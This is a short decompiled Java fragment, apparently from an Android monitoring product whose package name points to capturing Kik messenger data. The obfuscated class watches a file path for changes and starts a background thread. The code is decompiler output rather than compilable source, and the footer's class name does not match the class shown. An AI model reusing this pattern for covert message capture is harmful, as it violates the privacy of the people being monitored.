package com.vvt.capture.kik.a;

import android.os.FileObserver;
import java.io.File;

class c
  extends FileObserver
{
  private String b;
  private Thread c = null;
  private File d;
  
  public c(b paramb, String paramString)
  {
    super(paramString, 2);
    this.b = paramString;
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    Thread localThread = this.c;
    if (localThread == null)
    {
      localThread = new java/lang/Thread;
      d locald = new com/vvt/capture/kik/a/d;
      locald.<init>(this);
      localThread.<init>(locald);
      this.c = localThread;
      localThread = this.c;
      localThread.start();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/kik/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */